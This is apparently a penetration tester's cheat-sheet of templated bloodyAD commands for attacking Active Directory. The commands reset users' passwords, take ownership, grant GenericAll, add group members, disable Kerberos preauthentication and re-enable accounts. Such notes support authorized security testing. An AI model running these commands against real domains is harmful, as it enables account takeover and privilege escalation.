# bloodyad
#plateform/linux #target/remote #cat/ATTACK

## Set password
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' set password <target_user> '<new_passwd|Password123!>'
```

## Get writable
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' get writable
```

## Set owner
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' set owner '<object>' <our_user>
```

## Add GenericAll
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' add genericAll '<object>' <our_user>
```

## Add group member
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' add groupMember <group> <member>
```

## Disable preauth
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' add uac '<object>' -f DONT_REQ_PREAUTH
```

## Enable Account
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd' remove uac 'account' -f ACCOUNTDISABLE
```
